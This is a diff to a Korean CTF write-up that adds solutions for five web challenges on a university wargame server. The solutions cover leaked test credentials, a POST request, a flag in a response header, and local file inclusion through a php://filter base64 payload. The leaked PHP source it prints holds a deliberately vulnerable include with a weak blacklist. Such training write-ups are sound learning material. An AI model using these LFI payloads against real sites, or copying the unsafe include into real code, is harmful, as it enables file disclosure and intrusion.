@@ -8,8 +8,6 @@
 
 `18_`로 시작하는 문제들은 작년(2017년)에 출제된 문제이니 준비하실거라면 푸는것도 추천드립니다!
 
-도움 되셨다면 중등심화 양희성에게 커피 한잔 사주세요 :D
-
 ## Table of Contents
 
 * Web
@@ -199,10 +197,189 @@ FLAG: W1nn3r_C0ngr4tur4t1on
 ```
 
 ### Web1_Project3 (200pt)
+
+![](img/Web1_Project3.png)
+
+
+#### 소스코드
+```html
+<body>
+    <div class="login_box">
+        <div class="box_title">
+            <span>관리자로그인</span>
+        </div>
+        <div class="login_form">
+            <form method="post">
+                <input name="id" type="text" class="login_id" placeholder="ID"/><br />
+                    <input name="pw" type="password" class="login_pw" placeholder="PW"/><br />
+                    <input type="submit" value="로그인">
+            </form>
+        </div>
+        <div class="status">
+                    </div>
+    </div>
+</body>
+<!--
+Test Account : admin/admin123
+    -->
+```
+
+뭔가 굉장히 로그인 하고 싶어진다.
+
+ID를 `admin`으로 하고 비밀번호를 `admin123`으로 해주면 됩니당!
+
+![](img/Web1_Project3-2.png)
+
+
+```
+FLAG: Unc0mpleted_Devel0pment
+```
+
 ### Web2_Project3 (200pt)
+
+처음 URL에 접속하면 다음과 같이 뜬다.
+
+```
+Plz POST me T.T
+```
+
+그러면 POST로 해보자.
+
+
+```
+Python 3.7.0 (v3.7.0:1bf9cc5093, Jun 27 2018, 04:06:47) [MSC v.1914 32 bit (Intel)] on win32
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import requests
+>>> response = requests.post('http://wargame_sec.kongju.ac.kr/web/web2_DJU/index.php')
+>>> response.text
+'<!DOCTYPE html>\n<html>\n\t<head>\n\t\t<title>web02</title>\n\t</head>\n\t<body>\n\t\tKEY is : p0s7_m3_1f_y0u_can\t</body>\n</html>\n'
+>>>
+```
+
+```
+FLAG: p0s7_m3_1f_y0u_can
+```
+
 ### Web3_Project3 (200pt)
+
+페이지에 들어가면 다음과 같이 뜬다.
+
+```
+이 페이지에서 이미 키를 드렸습니다.
+```
+
+뭐지 하고 개발자 도구에서 Network 탭에 들어가니 Response Header에 플래그가 담겨져 있었다.
+
+![](img/Web3_Project3.png)
+
+```
+FLAG: thisisKey
+```
+
 ### Web4_Project3 (200pt)
+
+![](img/Web4_Project3.png)
+
+페이지를 돌아다녀 보면 URL의 쿼리 스트링중 game이 바뀌는 것을 알수 있다.
+
+```
+http://wargame_sec.kongju.ac.kr/web/web4_DJU/index.php?game=lol
+```
+
+`http://wargame_sec.kongju.ac.kr/web/web4_DJU/lol.php`의 URL로 접속하면 공통된 부분을 제외한 부분만이 담겨져 있는것을 알 수 있다.
+
+저 game 파라미터에 flag을 넣어보았다.
+
+![](img/Web4_Project3-2.png)
+
+```
+FLAG: L0cal_F1l3_1nclus10n!!
+```
+
 ### Web5_Project3 (200pt)
+
+![](img/Web5_Project3.png)
+
+PHP Wrapper을 사용하면 LFI를 할 수 있다. base64로 해도 되고 rot13으로도 해도 되는데 그냥 base64가 편해서 base64로 했다.
+
+보아하니 따로 플래그 파일이 있는것이 아니고 저 `index.php` 파일 안에 플래그가 있어 보이니까 index.php를 base64 encode 했다.
+
+```
+php://filter/convert.base64-encode/resource=index.php
+```
+
+![](img/Web5_Project3-2.png)
+
+이걸 base64 decode 하면 다음과 같은 소스 코드가 나온다!
+
+```php
+<?php
+	// Key is : LFI_WITH_BASE64_IS_VERY_DANGEROUS_!
+?>
+<html>
+	<head>
+		<title>web05</title>
+		<style>
+			html, body{
+				width: 100%;
+				margin: 0;
+				padding: 0;
+				text-align: center;
+			}
+			body{
+				margin-top: 40px;
+			}
+			.output{
+				width: 800px;
+				height: 120px !important;
+				border: 1px solid #aaa;
+				margin: 0 auto 20px auto;
+				overflow-y: scroll;
+			}
+			.source{
+				width: 504px;
+				margin: 20px auto;
+			}
+		</style>
+	</head>
+	<body>
+		<h1>LFI (Local File Inclusion)</h1>
+		<form method="get">
+		<input type="text" name="url"/>
+		<input type="submit" value="ViewFile">
+		</form>
+		<div class="output">
+			<?php
+				if(isset($_GET["url"]) && !empty($_GET["url"])){
+					$escape_pattern = array("etc","passwd", "ini", "%", "/");
+					if(in_array($_GET["url"], $escape_pattern)){
+						echo "No Hack~!";
+						exit;
+					}
+					if(!file_exists($_GET["url"])){
+						echo "No File Exists!\n";
+					}
+					include $_GET["url"];
+				}else if(isset($_GET["url"]) && empty($_GET["url"])){
+					echo "Empty!";
+				}
+			?>
+		</div>
+		<hr>
+		<div class="source">
+			index.php SOURCE<br />
+			<?php
+				include "./source.html";
+			?>
+		</div>
+	</body>
+</html>
+```
+
+```
+FLAG: LFI_WITH_BASE64_IS_VERY_DANGEROUS_!
+```
+
 ### 18_web1 (50pt)
 ### 18_web2 (100pt)
 ### 18_web3 (100pt)
